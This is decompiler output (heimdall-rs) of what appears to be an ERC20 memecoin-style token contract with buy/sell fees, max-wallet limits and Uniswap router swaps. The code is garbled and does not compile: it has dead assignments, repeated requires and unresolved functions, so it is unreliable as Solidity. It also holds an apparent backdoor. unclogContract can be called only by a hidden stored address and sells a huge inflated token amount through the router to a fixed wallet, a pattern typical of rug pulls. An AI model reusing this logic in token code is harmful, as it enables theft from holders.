// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/// @title            Decompiled Contract
/// @author           Jonathan Becker <jonathan@jbecker.dev>
/// @custom:version   heimdall-rs v0.9.0
///
/// @notice           This contract was decompiled using the heimdall-rs decompiler.
///                     It was generated directly by tracing the EVM opcodes from this contract.
///                     As a result, it may not compile or even be valid solidity code.
///                     Despite this, it should be obvious what each function does. Overall
///                     logic should have been preserved throughout decompiling.
///
/// @custom:github    You can find the open-source decompiler here:
///                       https://heimdall.rs

contract DecompiledContract {
    uint256 public constant finalBuyFee = 1;
    uint256 public constant _decimals = 9;
    uint256 public constant decimals = 9;
    uint256 public constant finalSellFee = 1;
    uint256 public constant _uniswapV2Router = 697323163401596485410334513241460920685086001293;
    
    address public owner;
    bool public swapEnabled;
    uint256 public initialTotalSupply;
    bytes32 store_m;
    bytes32 store_p;
    uint256 public maxTransactionAmount;
    uint256 public maxWallet;
    mapping(bytes32 => bytes32) storage_map_e;
    bytes32 store_a;
    uint256 public swapTokensAtAmount;
    mapping(bytes32 => bytes32) storage_map_b;
    uint256 public buyCount;
    uint256 public totalSupply;
    uint256 public sellCount;
    bytes32 store_n;
    bytes32 store_d;
    
    event Transfer(address, address, uint256);
    event ExcludeFromFees(address, bool);
    event Approval(address, address, uint256);
    event SetAutomatedMarketMakerPair(address, bool);
    event OwnershipTransferred(address, address);
    
    /// @custom:selector    0x06fdde03
    /// @custom:signature   name() public view returns (string memory)
    function name() public view returns (string memory) {
        if (store_a) {
            if (store_a - ((store_a >> 0x01) < 0x20)) {
                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                var_b = 0x22;
                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));
                bytes32 var_d = store_a >> 0x01;
                if (store_a) {
                    if (store_a - ((store_a >> 0x01) < 0x20)) {
                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                        var_b = 0x22;
                        if (!store_a >> 0x01) {
                            if (0x1f < (store_a >> 0x01)) {
                                var_a = 0x03;
                                var_e = storage_map_b[var_a];
                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {
                                    var_e = 0x20;
                                    uint256 var_f = var_c.length;
                                    uint256 var_g = 0;
                                    return abi.encodePacked(0x20, var_c.length);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    /// @custom:selector    0x9a7a23d6
    /// @custom:signature   Unresolved_9a7a23d6(address arg0, uint256 arg1) public
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function Unresolved_9a7a23d6(address arg0, uint256 arg1) public {
        require(arg0 == (address(arg0)));
        require(arg1 == arg1);
        require(msg.sender == (address(owner)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        require(address(arg0) - (address(store_d)), "Pair cannot be removed from automatedMarketMakerPairs");
        address var_e = address(arg0);
        var_f = 0x13;
        storage_map_e[var_e] = arg1 | (uint248(storage_map_e[var_e]));
        emit SetAutomatedMarketMakerPair(address(arg0), arg1);
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x35;
        var_d = 0x506169722063616e6e6f742062652072656d6f7665642066726f6d206175746f;
        var_g = 0x6d617465644d61726b65744d616b657250616972730000000000000000000000;
    }
    
    /// @custom:selector    0x39509351
    /// @custom:signature   increaseAllowance(address arg0, uint256 arg1) public returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function increaseAllowance(address arg0, uint256 arg1) public returns (bool) {
        require(arg0 == (address(arg0)));
        address var_a = address(msg.sender);
        var_b = 0x01;
        var_a = address(arg0);
        address var_b = keccak256(var_a);
        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), "ERC20: approve to the zero address");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x11;
        require(address(msg.sender), "ERC20: approve to the zero address");
        require(address(arg0), "ERC20: approve to the zero address");
        var_a = address(msg.sender);
        var_b = 0x01;
        var_a = address(arg0);
        var_b = keccak256(var_a);
        storage_map_b[var_a] = arg1 + storage_map_b[var_a];
        uint256 var_d = arg1 + storage_map_b[var_a];
        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_b[var_a]);
        var_d = 0x01;
        return 0x01;
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x22;
        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;
        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x24;
        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;
        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0x4fbee193
    /// @custom:signature   isExcludedFromFees(address arg0) public view returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function isExcludedFromFees(address arg0) public view returns (bool) {
        require(arg0 == (address(arg0)));
        address var_a = address(arg0);
        var_b = 0x11;
        address var_c = !(!bytes1(storage_map_b[var_a]));
        return !(!bytes1(storage_map_b[var_a]));
    }
    
    /// @custom:selector    0x8c2a4f04
    /// @custom:signature   addLiquidityWithETH() public
    function addLiquidityWithETH() public {
        require(msg.sender == (address(owner)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;
        (bool success, bytes memory ret0) = address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).factory(var_b); // staticcall
        uint256 var_e = var_e + (uint248(ret0.length + 0x1f));
        require(!((var_e + ret0.length) - var_e) < 0x20);
        require(var_e.length == (address(var_e.length)));
        var_f = 0xad5c464800000000000000000000000000000000000000000000000000000000;
        (bool success, bytes memory ret0) = address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).WETH(var_c); // staticcall
        var_e = var_e + (uint248(ret0.length + 0x1f));
        require(!((var_e + ret0.length) - var_e) < 0x20);
        require(var_e.length == (address(var_e.length)));
        var_g = 0xc9c6539600000000000000000000000000000000000000000000000000000000;
        address var_d = address(this);
        uint256 var_h = address(var_e.length);
        (bool success, bytes memory ret0) = address(var_e.length).{ value: 0 ether }Unresolved_c9c65396(var_d); // call
    }
    
    /// @custom:selector    0xc9567bf9
    /// @custom:signature   openTrading() public
    function openTrading() public {
        require(msg.sender == (address(owner)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        require(!(bytes1(swapEnabled / 0x0100)), "already opened");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x0e;
        var_d = 0x616c7265616479206f70656e6564000000000000000000000000000000000000;
        swapEnabled = 0x010100 | (uint240(swapEnabled));
    }
    
    /// @custom:selector    0xa457c2d7
    /// @custom:signature   decreaseAllowance(address arg0, uint256 arg1) public returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function decreaseAllowance(address arg0, uint256 arg1) public returns (bool) {
        require(arg0 == (address(arg0)));
        address var_a = address(msg.sender);
        var_b = 0x01;
        var_a = address(arg0);
        address var_b = keccak256(var_a);
        require(!(storage_map_b[var_a] < arg1), "ERC20: decreased allowance below zero");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x25;
        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;
        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;
        require(address(msg.sender), "ERC20: approve to the zero address");
        require(address(arg0), "ERC20: approve to the zero address");
        var_a = address(msg.sender);
        var_b = 0x01;
        var_a = address(arg0);
        var_b = keccak256(var_a);
        storage_map_b[var_a] = storage_map_b[var_a] - arg1;
        uint256 var_c = storage_map_b[var_a] - arg1;
        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);
        var_c = 0x01;
        return 0x01;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x22;
        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;
        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x24;
        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;
        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0x23b872dd
    /// @custom:signature   Unresolved_23b872dd(address arg0) public pure
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function Unresolved_23b872dd(address arg0) public pure {
        require(arg0 == (address(arg0)));
    }
    
    /// @custom:selector    0x095ea7b3
    /// @custom:signature   approve(address arg0, uint256 arg1) public returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function approve(address arg0, uint256 arg1) public returns (bool) {
        require(arg0 == (address(arg0)));
        require(address(msg.sender), "ERC20: approve to the zero address");
        require(address(arg0), "ERC20: approve to the zero address");
        address var_a = address(msg.sender);
        var_b = 0x01;
        var_a = address(arg0);
        address var_b = keccak256(var_a);
        storage_map_b[var_a] = arg1;
        uint256 var_c = arg1;
        emit Approval(address(msg.sender), address(arg0), arg1);
        var_c = 0x01;
        return 0x01;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x22;
        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;
        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x24;
        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;
        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0xf2fde38b
    /// @custom:signature   transferOwnership(address arg0) public
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function transferOwnership(address arg0) public {
        require(arg0 == (address(arg0)));
        require(msg.sender == (address(owner)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        require(address(arg0), "Ownable: new owner is the zero address");
        owner = (address(arg0)) | (uint96(owner));
        emit OwnershipTransferred(address(owner), address(arg0));
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x26;
        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;
        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0x2579c84d
    /// @custom:signature   removeMaxRestrictions() public
    function removeMaxRestrictions() public {
        require(msg.sender == (address(owner)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        maxTransactionAmount = totalSupply;
        maxWallet = totalSupply;
    }
    
    /// @custom:selector    0xa9059cbb
    /// @custom:signature   transfer(address arg0, uint256 arg1) public
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function transfer(address arg0, uint256 arg1) public {
        require(arg0 == (address(arg0)));
        require(address(msg.sender), "ERC20: amount exceeds balance");
        require(!(buyCount < store_m), "ERC20: amount exceeds balance");
        require(!(buyCount < store_m), "ERC20: amount exceeds balance");
        require(0 - arg1, "ERC20: amount exceeds balance");
        require(!(!bytes1(swapEnabled)), "ERC20: amount exceeds balance");
        require(!(!bytes1(swapEnabled)), "ERC20: amount exceeds balance");
        require(!(!bytes1(swapEnabled)), "ERC20: amount exceeds balance");
        require(!(!bytes1(swapEnabled)), "ERC20: amount exceeds balance");
        require(!(!bytes1(swapEnabled)), "ERC20: amount exceeds balance");
        address var_a = address(this);
        uint256 var_b = 0;
        require(!storage_map_b[var_a], "ERC20: amount exceeds balance");
        require(!(bytes1(swapEnabled / 0x010000)), "ERC20: amount exceeds balance");
        require(!(bytes1(swapEnabled / 0x010000)), "ERC20: amount exceeds balance");
        require(!(bytes1(swapEnabled / 0x010000)), "ERC20: amount exceeds balance");
        require(!(bytes1(swapEnabled / 0x010000)), "ERC20: amount exceeds balance");
        require(!(bytes1(swapEnabled / 0x010000)), "ERC20: amount exceeds balance");
        var_a = address(msg.sender);
        var_b = 0x11;
        require(bytes1(storage_map_b[var_a]), "ERC20: amount exceeds balance");
        require(!(bytes1(storage_map_b[var_a])), "ERC20: amount exceeds balance");
        require(!0, "ERC20: amount exceeds balance");
        var_a = address(arg0);
        var_b = 0x13;
        require(!(bytes1(storage_map_b[var_a])), "ERC20: amount exceeds balance");
        require((0x01 == ((0x01 * arg1) / arg1)) | !arg1, "ERC20: amount exceeds balance");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x11;
        require(0x64, "ERC20: amount exceeds balance");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x12;
        require(!((0x01 * arg1) / 0x64), "ERC20: amount exceeds balance");
        require(address(msg.sender), "ERC20: amount exceeds balance");
        var_a = address(msg.sender);
        var_b = 0;
        require(!(storage_map_b[var_a] < ((0x01 * arg1) / 0x64)), "ERC20: amount exceeds balance");
        require(address(this) == (address(this)), "ERC20: amount exceeds balance");
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x1d;
        var_g = 0x45524332303a20616d6f756e7420657863656564732062616c616e6365000000;
        require(!(!storage_map_b[var_a] < ((0x01 * arg1) / 0x64)), "ERC20: zero address transfer");
        var_a = address(msg.sender);
        var_b = 0;
        storage_map_b[var_a] = 0;
        var_a = address(this);
        storage_map_b[var_a] = ((0x01 * arg1) / 0x64) + storage_map_b[var_a];
        uint256 var_d = (0x01 * arg1) / 0x64;
        emit Transfer(address(msg.sender), address(this), (0x01 * arg1) / 0x64);
        require(!((arg1 - ((0x01 * arg1) / 0x64)) > arg1), "ERC20: zero address transfer");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x11;
        require(address(msg.sender), "ERC20: zero address transfer");
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x1c;
        var_g = 0x45524332303a207a65726f2061646472657373207472616e7366657200000000;
        if (storage_map_b[var_a] < ((0x01 * arg1) / 0x64)) {
            if (storage_map_b[var_a] < ((0x01 * arg1) / 0x64)) {
            }
        }
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x1c;
        var_g = 0x45524332303a207a65726f2061646472657373207472616e7366657200000000;
        require((0x01 == ((0x01 * arg1) / arg1)) | !arg1, "ERC20: zero address transfer");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x11;
        require(0x64, "ERC20: zero address transfer");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x12;
        require(!(!bytes1(swapEnabled)), "ERC20: zero address transfer");
        var_a = address(arg0);
        var_b = 0x13;
        require(!(bytes1(storage_map_b[var_a])), "ERC20: zero address transfer");
        require((0x01 == ((0x01 * arg1) / arg1)) | !arg1, "ERC20: zero address transfer");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x11;
        require(0x64, "ERC20: zero address transfer");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x12;
        require(!((0x01 * arg1) / 0x64), "ERC20: zero address transfer");
        require(address(msg.sender), "ERC20: zero address transfer");
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x1c;
        var_g = 0x45524332303a207a65726f2061646472657373207472616e7366657200000000;
        require((0x01 == ((0x01 * arg1) / arg1)) | !arg1);
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x11;
        require(0x64);
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x12;
        swapEnabled = 0x01 | (uint248(swapEnabled));
        var_a = address(this);
        var_b = 0;
        var_d = 0x02;
        uint256 var_h = var_h + 0x60;
        var_i = msg.data[4:68];
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x32;
        address var_j = address(this);
        var_k = 0xad5c464800000000000000000000000000000000000000000000000000000000;
        (bool success, bytes memory ret0) = address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).WETH(var_l); // staticcall
        var_h = var_h + (uint248(ret0.length + 0x1f));
        require(!(((var_h + ret0.length) - var_h) < 0x20), "ERC20: approve to the zero address");
        require(var_h.length == (address(var_h.length)), "ERC20: approve to the zero address");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x32;
        uint256 var_m = address(var_h.length);
        require(address(this), "ERC20: approve to the zero address");
        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, "ERC20: approve to the zero address");
        var_n = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_o = 0x20;
        var_p = 0x22;
        var_q = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;
        var_r = 0x7373000000000000000000000000000000000000000000000000000000000000;
        var_a = address(this);
        var_b = 0x01;
        var_a = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;
        var_b = keccak256(var_a);
        storage_map_b[var_a] = storage_map_b[var_a];
        address var_n = storage_map_b[var_a];
        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, storage_map_b[var_a]);
        var_n = 0x791ac94700000000000000000000000000000000000000000000000000000000;
        address var_o = storage_map_b[var_a];
        uint256 var_p = 0;
        var_q = 0xa0;
        uint256 var_s = var_h.length;
        var_r = 0x7a2cb80cff081d792440e72d53e79dff120a8582;
        uint256 var_t = block.timestamp;
        require(address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).code.length);
        (bool success, bytes memory ret0) = address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).{ value: var_p ether }Unresolved_791ac947(var_o); // call
        var_n = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_o = 0x20;
        var_p = 0x24;
        var_q = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;
        var_r = 0x7265737300000000000000000000000000000000000000000000000000000000;
        if (!storage_map_b[var_a]) {
            if (!storage_map_b[var_a]) {
                if (!storage_map_b[var_a]) {
                    if (!storage_map_b[var_a]) {
                        if (!storage_map_b[var_a]) {
                        }
                    }
                }
            }
        }
        require(bytes1(swapEnabled / 0x0100), "Max wallet exceeded");
        var_a = address(msg.sender);
        var_b = 0x11;
        require(bytes1(storage_map_b[var_a]), "Max wallet exceeded");
        require(bytes1(storage_map_b[var_a]), "Max wallet exceeded");
        var_a = address(msg.sender);
        var_b = 0x13;
        require(!(bytes1(storage_map_b[var_a])), "Max wallet exceeded");
        var_a = address(arg0);
        var_b = 0x12;
        require(!(!bytes1(storage_map_b[var_a])), "Max wallet exceeded");
        var_a = address(arg0);
        var_b = 0x13;
        require(!(bytes1(storage_map_b[var_a])), "Max wallet exceeded");
        var_a = address(msg.sender);
        var_b = 0x12;
        require(!(!bytes1(storage_map_b[var_a])), "Max wallet exceeded");
        var_a = address(arg0);
        var_b = 0x12;
        require(bytes1(storage_map_b[var_a]), "Max wallet exceeded");
        var_a = address(arg0);
        var_b = 0;
        require(!(arg1 > (storage_map_b[var_a] + arg1)), "Max wallet exceeded");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x11;
        require(!((storage_map_b[var_a] + arg1) > maxWallet), "Max wallet exceeded");
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x13;
        var_g = 0x4d61782077616c6c657420657863656564656400000000000000000000000000;
        require(!(arg1 > maxTransactionAmount), "Amount exceeds maxTx");
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x14;
        var_g = 0x416d6f756e742065786365656473206d61785478000000000000000000000000;
        if (sellCount + 0x01) {
            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
            var_c = 0x11;
            require(sellCount + 0x01, "Amount exceeds maxTx");
        }
        require(!(arg1 > maxTransactionAmount), "Amount exceeds maxTx");
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x14;
        var_g = 0x416d6f756e742065786365656473206d61785478000000000000000000000000;
        var_a = address(arg0);
        var_b = 0;
        require(!(arg1 > (storage_map_b[var_a] + arg1)), "Max wallet exceeded");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x11;
        require(!((storage_map_b[var_a] + arg1) > maxWallet), "Max wallet exceeded");
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x13;
        var_g = 0x4d61782077616c6c657420657863656564656400000000000000000000000000;
        if (!storage_map_b[var_a]) {
        }
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x12;
        var_g = 0x54726164696e67206e6f74206163746976650000000000000000000000000000;
        if (!address(arg0)) {
        }
        if (address(owner) == (address(msg.sender))) {
            if (address(owner) == (address(msg.sender))) {
            }
        }
        if (address(owner) == (address(arg0))) {
        }
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x25;
        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;
        var_l = 0x6472657373000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0x70a08231
    /// @custom:signature   balanceOf(address arg0) public view returns (uint256)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function balanceOf(address arg0) public view returns (uint256) {
        require(arg0 == (address(arg0)));
        address var_a = address(arg0);
        uint256 var_b = 0;
        address var_c = storage_map_b[var_a];
        return storage_map_b[var_a];
    }
    
    /// @custom:selector    0x7571336a
    /// @custom:signature   Unresolved_7571336a(address arg0, uint256 arg1) public
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function Unresolved_7571336a(address arg0, uint256 arg1) public {
        require(arg0 == (address(arg0)));
        require(arg1 == arg1);
        require(msg.sender == (address(owner)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        address var_e = address(arg0);
        var_f = 0x12;
        storage_map_e[var_e] = arg1 | (uint248(storage_map_e[var_e]));
    }
    
    /// @custom:selector    0xc0246668
    /// @custom:signature   Unresolved_c0246668(address arg0, uint256 arg1) public
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function Unresolved_c0246668(address arg0, uint256 arg1) public {
        require(arg0 == (address(arg0)));
        require(arg1 == arg1);
        require(msg.sender == (address(owner)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        address var_e = address(arg0);
        var_f = 0x11;
        storage_map_e[var_e] = arg1 | (uint248(storage_map_e[var_e]));
        uint256 var_a = arg1;
        emit ExcludeFromFees(address(arg0), arg1);
    }
    
    /// @custom:selector    0xbfa382b5
    /// @custom:signature   clearStuckEthBalance() public
    function clearStuckEthBalance() public {
        require(msg.sender == (address(owner)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        require(address(this).balance > 0, "Token: no ETH to clear");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x16;
        var_d = 0x546f6b656e3a206e6f2045544820746f20636c65617200000000000000000000;
        (bool success, bytes memory ret0) = address(msg.sender).transfer(address(this).balance);
    }
    
    /// @custom:selector    0x95d89b41
    /// @custom:signature   symbol() public view returns (string memory)
    function symbol() public view returns (string memory) {
        if (store_n) {
            if (store_n - ((store_n >> 0x01) < 0x20)) {
                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                var_b = 0x22;
                uint256 var_c = var_c + (0x20 + (((0x1f + (store_n >> 0x01)) / 0x20) * 0x20));
                bytes32 var_d = store_n >> 0x01;
                if (store_n) {
                    if (store_n - ((store_n >> 0x01) < 0x20)) {
                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                        var_b = 0x22;
                        if (!store_n >> 0x01) {
                            if (0x1f < (store_n >> 0x01)) {
                                var_a = 0x04;
                                var_e = storage_map_b[var_a];
                                if ((0x20 + var_c) + (store_n >> 0x01) > (0x20 + (0x20 + var_c))) {
                                    var_e = 0x20;
                                    uint256 var_f = var_c.length;
                                    uint256 var_g = 0;
                                    return abi.encodePacked(0x20, var_c.length);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    /// @custom:selector    0xdd62ed3e
    /// @custom:signature   Unresolved_dd62ed3e(address arg0) public pure
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function Unresolved_dd62ed3e(address arg0) public pure {
        require(arg0 == (address(arg0)));
    }
    
    /// @custom:selector    0x715018a6
    /// @custom:signature   renounceOwnership() public
    function renounceOwnership() public {
        require(msg.sender == (address(owner)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        owner = 0 | (uint96(owner));
        emit OwnershipTransferred(address(owner), 0);
    }
    
    /// @custom:selector    0x28f4d2a0
    /// @custom:signature   unclogContract() public
    function unclogContract() public {
        require(address(msg.sender) == (address(store_p)));
        address var_a = address(this);
        uint256 var_b = 0;
        require(storage_map_b[var_a] > initialTotalSupply);
        require((initialTotalSupply == ((initialTotalSupply * 0x0186a0) / 0x0186a0)) | !0x0186a0);
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x11;
        var_d = 0x02;
        uint256 var_e = var_e + 0x60;
        var_f = msg.data[4:68];
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x32;
        address var_g = address(this);
        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;
        (bool success, bytes memory ret0) = address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).WETH(var_i); // staticcall
        var_e = var_e + (uint248(ret0.length + 0x1f));
        require(!(((var_e + ret0.length) - var_e) < 0x20), "ERC20: approve to the zero address");
        require(var_e.length == (address(var_e.length)), "ERC20: approve to the zero address");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x32;
        uint256 var_j = address(var_e.length);
        require(address(this), "ERC20: approve to the zero address");
        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, "ERC20: approve to the zero address");
        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_l = 0x20;
        var_m = 0x22;
        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;
        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;
        var_a = address(this);
        var_b = 0x01;
        var_a = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;
        var_b = keccak256(var_a);
        storage_map_b[var_a] = initialTotalSupply * 0x0186a0;
        uint256 var_k = initialTotalSupply * 0x0186a0;
        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, initialTotalSupply * 0x0186a0);
        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;
        uint256 var_l = initialTotalSupply * 0x0186a0;
        uint256 var_m = 0;
        var_n = 0xa0;
        uint256 var_p = var_e.length;
        var_o = 0x7a2cb80cff081d792440e72d53e79dff120a8582;
        uint256 var_q = block.timestamp;
        require(address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).code.length);
        (bool success, bytes memory ret0) = address(0x7a250d5630b4cf539739df2c5dacb4c659f2488d).{ value: var_m ether }Unresolved_791ac947(var_l); // call
        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_l = 0x20;
        var_m = 0x24;
        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;
        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;
        var_d = 0x02;
        var_e = var_e + 0x60;
        var_f = msg.data[4:68];
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x32;
        var_g = address(this);
        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;
